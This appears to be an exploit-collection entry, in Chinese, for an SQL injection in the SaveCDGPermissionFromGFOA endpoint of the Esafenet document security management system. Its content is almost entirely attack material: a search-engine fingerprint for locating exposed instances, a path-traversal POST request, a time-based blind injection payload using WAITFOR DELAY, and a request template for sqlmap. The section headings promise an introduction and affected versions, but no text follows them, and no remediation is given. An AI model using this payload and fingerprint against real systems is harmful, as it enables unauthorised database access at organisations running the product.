# 亿赛通电子文档安全管理系统SaveCDGPermissionFromGFOA存在SQL注入漏洞

- **系统**：亿赛通电子文档安全管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="ESAFENET 亿赛通文档安全管理系统"`
- **请求**：`POST /CDGServer3/js/../SaveCDGPermissionFromGFOA HTTP/1.1`
- **关键头**：`Content-Length: 39`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
fileId=1';WAITFOR DELAY '0:0:5'--&pis=1

sqlmap
POST /CDGServer3/js/../SaveCDGPermissionFromGFOA HTTP/1.1
Host:
Content-Length: 15
Content-Type: application/x-www-form-urlencoded
fileId=1&pis=1
```

**其他**
- 亿赛通电子文档安全管理系统SaveCDGPermissionFromGFOA存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿赛通电子文档安全管理系统